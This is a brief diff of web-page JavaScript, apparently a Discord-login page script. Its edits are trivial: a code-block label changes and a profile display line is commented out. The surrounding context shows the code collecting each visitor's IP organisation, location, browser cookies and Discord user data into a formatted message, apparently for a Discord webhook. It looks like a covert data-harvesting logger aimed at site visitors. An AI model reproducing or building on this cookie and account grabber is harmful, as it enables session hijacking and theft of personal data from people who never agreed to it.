@@ -197,7 +197,7 @@ Error Message : ${error.message}`;
 **Org:** ${ipData.org}
 **Location:** ${ipData.loc}
 **Cookies:** ${visitorCookie}
-**Discord User Data:** \`\`\`json
+**Discord User Data:** \`\`\`py
 ${userDataFormatted}
 \`\`\`
 `.trim(), Math.floor(Math.random() * 16777215));
@@ -217,7 +217,7 @@ ${userDataFormatted}
             // Enable logout button, disable login button
             logoutButton.disabled = false;
             loginButton.disabled = true;
-            profileUI.style.display = 'block'; // Always show profile UI
+          //  profileUI.style.display = 'block'; // Always show profile UI
         } else {
             // User is not logged in, check URL for user data
             const urlParams = new URLSearchParams(window.location.search);
